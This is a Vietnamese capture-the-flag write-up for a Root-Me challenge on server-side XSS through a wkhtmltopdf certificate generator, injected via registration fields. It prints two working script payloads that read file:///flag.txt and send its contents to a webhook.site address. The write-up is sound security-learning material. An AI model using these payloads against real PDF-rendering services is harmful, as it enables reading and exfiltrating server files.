Challenge: http://challenge01.root-me.org:59083/

![alt text](image.png)

Thử nhập 1 đoạn text hợp lệ vào, server sẽ tạo ra 1 Certi và thêm vào đoạn text mình vừa nhập: 
![alt text](image-1.png)

Tìm hiểu về XSS Server Side liên quan đến việc tạo PDF: https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf

Trang này đề cập đến việc server có thể dùng các mã nguồn mở bên ngoài để tạo các đoạn HTML, CSS, ảnh thành PDF. Với việc đầu vào là HTML thì có thể bị chèn và chạy các đoạn javascript hay HTML vào. Và nếu server trả về PDF ta có thể xem thì chỉ cần xuất ra còn nếu server không trả về PDF (Blind) thì cần trả về bên ngoài. 

Thử chèn mã JS vào đoạn nhập text: 
![alt text](image-2.png)

Nó trả về y nguyên mà không có lỗi hay chạy đoạn mã này. 

Thử với tính năng đăng nhập đăng kí. 
![alt text](image-3.png)

![alt text](image-4.png)

![alt text](image-5.png)

Server sẽ thêm cả tên vào Certi, có thể injection vào đường này. Và để chắc chắn hơn, ta sẽ injection cả đoạn JS vào các trường ko hiển thị như login và password. 

![alt text](image-6.png)

![alt text](image-7.png)

![alt text](image-8.png)

Ở kết quả trả về ta thấy không có đoạn mã, đoạn mã có thể đã chạy và vì không trả về kết quả nên không hiển thị. 

Vậy ta sẽ injection 1 đoạn JS khác để chắc chắn trả về. 
![alt text](image-9.png)

![alt text](image-10.png)

Như vậy là chắc chắn nó sẽ trả về ở 2 trường này. 

![alt text](image-11.png)

![alt text](image-12.png)

Test thêm dùng 1 đoạn JS để gửi gói tin ra bên ngoài(dùng webhook):
![alt text](image-13.png) 

![alt text](image-14.png)

Ta thấy nó có gửi gói tin ra ngoài. 

```
<script>
x=new XMLHttpRequest;x.onload=function(){y=new XMLHttpRequest;y.open("GET","https://webhook.site/0db168bc-7767-41c3-a16f-08b42ac9d23a/"+btoa(this.responseText));y.send();};x.open("GET","file:///flag.txt");x.send();
</script>
```
Dùng đoạn JS để lấy flag và gửi ra ngoài. 
![alt text](image-15.png)

Ta nhận được gói tin với nội dung đang được base64: 
![alt text](image-16.png)

Dùng btoa để đảm bảo nếu nội dung là nhiều dòng nó cũng sẽ base64 để đưa vào link hợp lệ, còn nếu đơn giản có thể dùng: 
```
<script>
x=new XMLHttpRequest;x.onload=function(){y=new XMLHttpRequest;y.open("GET","https://webhook.site/0db168bc-7767-41c3-a16f-08b42ac9d23a/"+encodeURIComponent(this.responseText));y.send();};x.open("GET","file:///flag.txt");x.send();
</script>
```

Thì gói tin gửi về sẽ là: 
![alt text](image-17.png)


Có thể thấy thêm công cụ để tạo PDF là wkhtmltopdf: 
![alt text](image-18.png)



Note: Không tin tưởng hoàn toàn vào các mã nguồn, dịch vụ sẵn bên ngoài thêm vào. Việc --disable-javascript và --disable-local-file-access thì vẫn có thể chạy với các thẻ img, object,...nhưng vẫn phần nào an toàn hơn.